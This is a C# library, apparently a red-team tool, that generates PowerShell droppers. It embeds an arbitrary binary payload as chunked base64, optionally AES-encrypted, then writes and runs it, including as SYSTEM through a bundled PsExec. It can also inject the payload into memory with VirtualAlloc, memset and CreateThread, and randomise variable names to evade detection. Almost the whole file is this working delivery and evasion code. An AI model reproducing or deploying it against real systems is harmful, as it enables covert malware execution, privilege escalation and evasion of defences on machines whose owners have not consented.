using System;
using System.Collections.Generic;
using System.Diagnostics.Contracts;
using System.Linq;
using System.Text.RegularExpressions;
using VismutaLib.Properties;

namespace VismutaLib
{
    public class Vismuta
    {
        private const Int32 ChunkSize = 4096; //This is a sweet spot between speed (larger is better) and reliability (much more and PS hurls)
        public const String CRLF = "\r\n"; //Always use target environment (PS) line breaks rather than calling environment
        private static readonly Random Random = new Random();
        public const Int32 ZipStrength = 9; //0-9
        public const Int32 RandomFilenameLength = 8;

        [Pure]
        public static String Muta(DeployMethodFlags deployFlags, Byte[] srcBinary, String payloadName,
            String payloadExt, String payloadArgs, String keyphrase, String keyphraseVariable)
        {
            if (srcBinary == null)
                throw new ArgumentNullException(nameof(srcBinary));
            if (String.IsNullOrWhiteSpace(payloadName))
                throw new ArgumentException(nameof(payloadName));
            if(payloadExt == null)
                throw new ArgumentNullException(nameof(payloadExt));
            if(payloadArgs == null)
                throw new ArgumentNullException(nameof(payloadArgs));

            if (!IsValidDeployMethod(deployFlags))
                throw new InvalidOperationException("Invalid combination of options");
            if(String.IsNullOrWhiteSpace(keyphraseVariable) && deployFlags.HasFlag(DeployMethodFlags.ObfuscateVariables))
                throw new ArgumentException(nameof(keyphraseVariable));

            String dstShell = "[string] $cwd = (Get-Item -Path \".\\\" -Verbose).FullName;" + CRLF;
            String execName = GetRandomString(RandomFilenameLength, false);
            Byte[] execBinary = Convert.FromBase64String(Resources.ExecEncoded); //TODO: Take out redundant steps

            //Sanity Check
            if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) && deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                throw new InvalidOperationException("Interactive encryption or non-interactive encryption. Pick one.");

            //Deploy PSExec
            if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
            {
                //Encrypt PSExec
                if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) || deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                {
                    if (String.IsNullOrWhiteSpace(keyphrase))
                        throw new ArgumentException(nameof(keyphrase));
                    execBinary = Encryption.AES256Encrypt(execBinary, keyphrase);
                }

                String execEncoded = Convert.ToBase64String(execBinary, Base64FormattingOptions.None);

                dstShell += "[string] $execEncoded = \"\"; " + CRLF;
                foreach (String execChunk in ChunkString(execEncoded))
                    dstShell += $"$execEncoded += \"{execChunk}\"; " + CRLF;
                dstShell += "[byte[]] $exec = [System.Convert]::FromBase64String($execEncoded); " + CRLF;

                //Decrypt PSExec
                if (deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                {
                    dstShell += "[string] $keyphrase = " + keyphrase + ";" + CRLF;
                    dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$exec") + CRLF;
                }
                else if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive))
                {
                    dstShell += "[string] $keyphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($inputkey));" + CRLF;
                    dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$exec") + CRLF;
                }

                dstShell += $"[System.IO.File]::WriteAllBytes($cwd+\"\\{execName}.exe\", $exec); " + CRLF;
            }

            //Encrypt Payload
            if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive) || deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
            {
                if (String.IsNullOrWhiteSpace(keyphrase))
                    throw new ArgumentException(nameof(keyphrase));
                srcBinary = Encryption.AES256Encrypt(srcBinary, keyphrase);
            }

            String srcEncoded = Convert.ToBase64String(srcBinary, Base64FormattingOptions.None);

            //Deploy Payload
            dstShell += "[string] $payloadEncoded = \"\"; " + CRLF;
            foreach (String payloadChunk in ChunkString(srcEncoded))
                dstShell += $"$payloadEncoded += \"{payloadChunk}\"; " + CRLF;
            dstShell += "[byte[]] $payload = [System.Convert]::FromBase64String($payloadEncoded); " + CRLF;

            //Decrypt Payload
            if (deployFlags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
            {
                dstShell += "[string] $keyphrase = \"" + keyphrase + "\";" + CRLF;
                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$payload") + CRLF;
            }
            else if (deployFlags.HasFlag(DeployMethodFlags.EncryptInteractive))
            {
                dstShell += "[string] $keyphrase = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($inputkey));" + CRLF;
                dstShell += Resources.AES256Decrypt.Replace(Environment.NewLine, CRLF).Replace("[[PAYLOAD]]", "$payload") + CRLF;
            }

            if (deployFlags.HasFlag(DeployMethodFlags.Inject))
            {
                if(deployFlags.HasFlag(DeployMethodFlags.Deflate))
                    throw new InvalidOperationException("You cannot inject multiple files in to memory!");

                dstShell += "$apidef = \"[DllImport(`\"kernel32.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\";" + CRLF;
                dstShell += "$apidef += \"`r`n[DllImport(`\"kernel32.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\";" + CRLF;
                dstShell += "$apidef += \"`r`n[DllImport(`\"msvcrt.dll`\")]\";" + CRLF;
                dstShell += "$apidef += \"`r`npublic static extern IntPtr memset(IntPtr dest, uint src, uint count);\";" + CRLF;

                dstShell += "$invokeobj = Add-Type -memberDefinition $apidef -Name \"Win32\" -namespace Win32Functions -passthru;" + CRLF;
                dstShell += "$memalloc = $invokeobj::VirtualAlloc(0,[Math]::Max($payload.Length,0x1000),0x3000,0x40);" + CRLF;
                dstShell += "for ($i=0;$i -le($payload.Length-1);$i++) { $invokeobj::memset([IntPtr]($memalloc.ToInt32()+$i), $payload[$i], 1) | Out-Null };" + CRLF;
                dstShell += "$invokeobj::CreateThread(0,0,$memalloc,0,0,0);" + CRLF;
            }
            else
            {
                dstShell += $"[System.IO.File]::WriteAllBytes($cwd+\"\\{payloadName}{payloadExt}\", $payload); " + CRLF;
            }


            //Sanity checks
            if (deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy) && deployFlags.HasFlag(DeployMethodFlags.Deflate))
                throw new InvalidOperationException("Presently you can only deploy multiple files, not run them");

            //Unzip Payload
            if (deployFlags.HasFlag(DeployMethodFlags.Deflate))
            {
                //This method is undesirable as it requires PSv3
                //dstShell += "Add-Type -AssemblyName System.IO.Compression; " + CRLF;
                //dstShell += $"[System.IO.Compression.ZipFile]::ExtractToDirectory($cwd+\"\\{payloadName}{payloadExt}\", \".\"); " + CRLF;

                //https://msdn.microsoft.com/en-us/library/windows/desktop/bb787866%28v=vs.85%29.aspx
                const Int32 doNotDisplayProgress = 4;
                const Int32 respondYesToAll = 16;
                const Int32 ignoreError = 1024;
                const Int32 zipFlags = respondYesToAll | doNotDisplayProgress | ignoreError;
                dstShell += "$shell = New-Object -com Shell.Application; " + CRLF;
                dstShell += $"$shell.NameSpace($cwd).CopyHere($cwd + \"\\{payloadName}{payloadExt}\\*\", {zipFlags});" + CRLF;
            }

            //Sanity checks
            if (deployFlags.HasFlag(DeployMethodFlags.Inject) && deployFlags.HasFlag(DeployMethodFlags.PsExec))
                throw new InvalidOperationException("Cannot attempt to run a memory injected payload as SYSTEM (no file to run!)");
            if (deployFlags.HasFlag(DeployMethodFlags.Inject) && deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                throw new InvalidOperationException("Cannot attempt to run a memory injected payload (no file to run!)");
            

            //Run payload/PSExec
            if (deployFlags.HasFlag(DeployMethodFlags.RunAfterDeploy))
            {
                if (deployFlags.HasFlag(DeployMethodFlags.PsExec))
                    dstShell += $"./{execName}.exe -i -s -d -accepteula cmd /K \"{payloadName}{payloadExt} {payloadArgs}\"; " + CRLF;
                else
                    dstShell += $"./{payloadName}{payloadExt} {payloadArgs}; " + CRLF;
            }

            //Obfuscate variables
            if (deployFlags.HasFlag(DeployMethodFlags.ObfuscateVariables))
                dstShell = ObfuscatePSVariables(dstShell, keyphraseVariable);

            return dstShell;
        }

        private static String ObfuscatePSVariables(String shellText, String keyphraseVariable)
        {
            return ObfuscatePSVariables(shellText, keyphraseVariable, Random);
        }

        //NOTE: Doesn't work with non-alphanumeric variable names
        internal static String ObfuscatePSVariables(String shellText, String keyphraseVariable, Random random)
        {
            var regex = new Regex("\\$[a-zA-Z0-9_]+");
            var matches = regex.Matches(shellText).OfType<Match>().Select(m => m.Value);
            foreach (String var in matches.Distinct().Where(m => m != "$True" && m != "$False"))
                shellText = shellText.Replace(var, var == "$inputkey" ? keyphraseVariable : "$" + GetRandomString(8, false, random));
            return shellText;
        }

        [Pure]
        public static Boolean IsValidDeployMethod(DeployMethodFlags flags)
        {
            //Can't PSExec if we don't execute
            if (flags.HasFlag(DeployMethodFlags.PsExec) && !flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            //Deflate presently only happens for multiple files; we won't run them all
            if (flags.HasFlag(DeployMethodFlags.Deflate) && flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            //Lots of things we can't do when injecting in to memory
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.RunAfterDeploy))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.PsExec))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.Deflate))
                return false;
            if (flags.HasFlag(DeployMethodFlags.Inject) && flags.HasFlag(DeployMethodFlags.ObfuscateName))
                return false;
            //No, you can't has all teh encryptions
            if (flags.HasFlag(DeployMethodFlags.EncryptInteractive) &&
                flags.HasFlag(DeployMethodFlags.EncryptNonInteractive))
                return false;

            return true;
        }

        public static String GetRandomString(Int32 length, Boolean onlyLowercase)
        {
            return GetRandomString(length, onlyLowercase, Random);
        }

        internal static String GetRandomString(Int32 length, Boolean onlyLowercase, Random random)
        {
            const String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            const String lowercase = "abcdefghijklmnopqrstuvwxyz";
            return new String(Enumerable.Repeat(onlyLowercase ? lowercase : chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        [Pure]
        internal static IEnumerable<String> ChunkString(String input)
        {
            Int32 curLoc = 0;
            while (curLoc < input.Length)
            {
                Int32 take = Math.Min(ChunkSize, input.Length - curLoc);
                String execChunk = new String(input.Skip(curLoc).Take(take).ToArray());
                yield return execChunk;
                curLoc += take;
            }
        }
    }
}
